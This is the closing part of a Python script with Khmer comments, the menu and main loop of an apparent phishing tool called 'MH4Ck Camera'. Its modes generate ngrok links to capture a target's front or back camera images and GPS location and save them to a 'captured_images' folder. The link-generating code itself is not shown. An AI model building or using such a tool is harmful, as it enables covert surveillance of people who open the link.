        # សាកល្បងដំឡើងដោយស្វ័យប្រវត្តិ
        try:
            for pkg in missing:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg])
            print(f"{Colors.GREEN}[✅] ដំឡើងកញ្ចប់រួចរាល់!{Colors.END}")
        except:
            return False
    
    return True

def show_banner():
    """បង្ហាញ Banner"""
    os.system('clear')
    
    banner = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                                                                  ║
║     {Colors.WHITE}███╗   ███╗██╗  ██╗██╗  ██████╗██╗  ██╗{Colors.CYAN}             ║
║     {Colors.WHITE}████╗ ████║██║  ██║██║ ██╔════╝██║ ██╔╝{Colors.CYAN}             ║
║     {Colors.WHITE}██╔████╔██║███████║██║ ██║     █████╔╝ {Colors.CYAN}             ║
║     {Colors.WHITE}██║╚██╔╝██║██╔══██║██║ ██║     ██╔═██╗ {Colors.CYAN}             ║
║     {Colors.WHITE}██║ ╚═╝ ██║██║  ██║██║ ╚██████╗██║  ██╗{Colors.CYAN}             ║
║     {Colors.WHITE}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═════╝╚═╝  ╚═╝{Colors.CYAN}             ║
║                                                                  ║
║              {Colors.GREEN}📱 Camera Control Center v3.0{Colors.CYAN}                   ║
║              {Colors.YELLOW}ដំណើរការជាមួយ Ngrok v2{Colors.CYAN}                      ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║     {Colors.PURPLE}Developer{Colors.CYAN}  : {Colors.WHITE}@mengheang25{Colors.CYAN}                                   ║
║     {Colors.PURPLE}From{Colors.CYAN}        : {Colors.WHITE}Cambodia 🇰🇭{Colors.CYAN}                                ║
║     {Colors.PURPLE}Version{Colors.CYAN}     : {Colors.WHITE}3.0 (Ngrok v2 Stable){Colors.CYAN}                      ║
║     {Colors.PURPLE}Platform{Colors.CYAN}    : {Colors.WHITE}Termux / Linux{Colors.CYAN}                              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(banner)

def show_menu():
    """បង្ហាញ Menu"""
    menu = f"""
{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗
║                      {Colors.YELLOW}【 MAIN MENU 】{Colors.CYAN}                        ║
╠══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║  {Colors.GREEN}[1]{Colors.CYAN}  📸 {Colors.WHITE}Camera + Location{Colors.CYAN}      - GPS + កាមេរ៉ាមុខ      ║
║  {Colors.GREEN}[2]{Colors.CYAN}  📍 {Colors.WHITE}Only Location{Colors.CYAN}         - ទីតាំងតែប៉ុណ្ណោះ      ║
║  {Colors.GREEN}[3]{Colors.CYAN}  📷 {Colors.WHITE}Back Camera{Colors.CYAN}           - កាមេរ៉ាក្រោយ         ║
║  {Colors.GREEN}[4]{Colors.CYAN}  🤳 {Colors.WHITE}Front Camera{Colors.CYAN}          - កាមេរ៉ាមុខ           ║
║  {Colors.GREEN}[5]{Colors.CYAN}  🗑️ {Colors.WHITE}Clear Data{Colors.CYAN}           - លុបទិន្នន័យទាំងអស់ ║
║  {Colors.GREEN}[6]{Colors.CYAN}  ❌ {Colors.WHITE}Exit{Colors.CYAN}                 - ចាកចេញ              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝{Colors.END}
"""
    print(menu)

def clear_data():
    """លុបទិន្នន័យទាំងអស់"""
    confirm = input(f"{Colors.RED}លុបទិន្នន័យទាំងអស់? (yes/no): {Colors.END}").strip().lower()
    if confirm == 'yes':
        try:
            if os.path.exists('captured_images'):
                shutil.rmtree('captured_images')
                os.makedirs('captured_images')
            processed_clicks.clear()
            print(f"{Colors.GREEN}[✅] លុបទិន្នន័យរួចរាល់!{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[❌] បរាជ័យ: {e}{Colors.END}")
    else:
        print(f"{Colors.YELLOW}[⚠️] បោះបង់{Colors.END}")
    time.sleep(2)

def main():
    """មុខងារចម្បង"""
    
    # ពិនិត្យមើល dependencies
    if not check_dependencies():
        print(f"{Colors.RED}[❌] សូមដំឡើងកញ្ចប់ចាំបាច់ជាមុន!{Colors.END}")
        sys.exit(1)
    
    # បង្កើតថតសម្រាប់រក្សាទុករូបភាព
    os.makedirs('captured_images', exist_ok=True)
    
    # ចុះឈ្មោះ cleanup
    atexit.register(stop_ngrok)
    
    def signal_handler(sig, frame):
        print(f"\n{Colors.YELLOW}👋 លាហើយ!{Colors.END}")
        stop_ngrok()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    while True:
        try:
            show_banner()
            show_menu()
            
            choice = input(f"{Colors.YELLOW}🔹 ជ្រើសរើស (1-6): {Colors.END}").strip()
            
            if choice == '1':
                os.system('clear')
                print(f"{Colors.CYAN}📸 MODE: CAMERA + LOCATION{Colors.END}")
                create_link('cam_location')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '2':
                os.system('clear')
                print(f"{Colors.CYAN}📍 MODE: ONLY LOCATION{Colors.END}")
                create_link('only_location')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '3':
                os.system('clear')
                print(f"{Colors.CYAN}📷 MODE: BACK CAMERA{Colors.END}")
                create_link('back_camera')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '4':
                os.system('clear')
                print(f"{Colors.CYAN}🤳 MODE: FRONT CAMERA{Colors.END}")
                create_link('front_camera')
                input(f"\n{Colors.YELLOW}[⏹️] ចុច Enter ដើម្បីបន្ត...{Colors.END}")
                stop_ngrok()
                
            elif choice == '5':
                clear_data()
                
            elif choice == '6':
                print(f"\n{Colors.YELLOW}👋 លាហើយ!{Colors.END}")
                print(f"{Colors.GREEN}🙏 សូមអរគុណដែលបានប្រើប្រាស់ MH4Ck Camera{Colors.END}")
                stop_ngrok()
                sys.exit(0)
                
            else:
                print(f"{Colors.RED}❌ សូមជ្រើសរើស 1-6 តែប៉ុណ្ណោះ!{Colors.END}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}👋 លាហើយ!{Colors.END}")
            stop_ngrok()
            sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
            time.sleep(2)

if __name__ == '__main__':
    main()
